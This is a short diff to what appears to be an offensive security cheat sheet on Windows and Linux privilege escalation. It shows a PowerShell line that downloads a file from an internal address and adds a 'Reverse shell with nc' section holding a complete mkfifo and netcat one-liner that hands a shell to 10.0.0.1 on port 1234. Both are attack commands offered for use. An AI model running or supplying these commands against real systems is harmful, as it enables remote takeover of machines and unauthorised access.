@@ -379,3 +379,7 @@ Use: https://github.com/ohpe/juicy-potato
 ### With Powershell
 
 powershell -command "& { iwr http://192.168.199.1/win.txt -OutFile win.txt }"
+
+
+## Reverse shell with nc
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
